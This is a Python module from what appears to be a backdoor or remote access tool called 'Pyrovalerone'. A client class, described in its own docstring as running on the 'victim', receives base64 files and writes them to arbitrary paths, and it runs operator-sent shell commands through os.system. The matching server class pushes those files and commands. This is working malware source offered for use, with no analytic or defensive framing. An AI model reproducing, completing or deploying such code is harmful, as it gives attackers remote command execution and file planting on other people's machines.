"""
    Pyrovalerone
    Default OS Module
    Note: Features platform independant CRUD operations and code exection 
"""
import os
import base64
import BDProtocol
import BDFramework

""""
	@class ClientMain
	@brief The block that will be invoked by the client (victim)
"""
class ClientMain:

	def __init__(self, handler:BDProtocol):
		self.handler = handler
		self.conn = handler.conn
		self.cmdModules = ["upload", "download", "exec"]

	def registerCMDModules(self, modules:list):
		for module in modules:
			if module not in self.cmdModules:
				self.cmdModules.append(module)

	def runCMD(self, cmd:list):

		# If module does not exist execute it on the current system
		if not cmd[0] in self.cmdModules:
		   self.handler.send_msg("CMD_NOT_FOUND")

		# Get the command's function
		cmdFunction = getattr(self, cmd[0])

		# Notify victim of cmd to be executed
		self.handler.send_msg(cmd[0])

		# Run the command
		return cmdFunction(cmd)

	def upload(self, argv):
		filename = self.handler.recv_msg()
		try:
			targetFile = open(filename, 'wb')
			
			# Receive data from client
			data = self.handler.recv_msg()
			
			# Decode data
			data = base64.b64decode(data.encode('ascii'))

			# Write data to file
			targetFile.write(data)

			# Close file
			targetFile.close()

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	def download(self, argv):
		pass

	def exec(self, argv):
		cmd = self.handler.recv_msg()
		try:
			os.system(cmd)
		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'


class ServerMain:

	def __init__(self, handler):
		self.handler = handler
		self.conn = handler.conn
		self.cmdModules = ["upload", "download", "exec", "goodbye"]


	def registerCMDModules(self, modules:list):
		for module in modules:
			if module not in self.cmdModules:
				self.cmdModules.append(module)

	def runCMD(self, cmd):

		# If module does not exist execute it on the current system
		if not cmd[0] in self.cmdModules:
			os.system(cmd[0])
			return

		# Get the command's function
		cmdFunction = getattr(self, cmd[0])

		# Notify victim of cmd to be executed
		self.handler.send_msg(cmd[0])

		# Run the command
		return cmdFunction(cmd)

	def upload(self, argv):

		if len(argv) < 3:
			return b'INVALID_ARGUMENT'

		LFILE = argv[1]
		RFILE = argv[2]

		# Open lfile for reading
		DATA = open(LFILE, 'rb').read()

		# Encode data with base64
		DATA = base64.b64encode(DATA)
		
		# Send rfile name
		self.handler.send_msg(RFILE)

		# Send rfile data
		self.handler.send_msg(DATA)

		return self.handler.recv_msg()

	def download(self, argv):

		if len(argv) < 3:
			return b'INVALID_ARGUMENT'

		RFILE = argv[1]
		LFILE = argv[2]

		return b'INVALID_ARGUMENT'


	def exec(self, argv):

		if len(argv) < 2:
			return b'INVALID_ARGUMENT'

		command = argv[1]

		# Run command
		self.handler.send_msg(command)
		
		return self.handler.recv_msg()

	def goodbye(self, argv):
		self.conn.close()
		self.conn = None
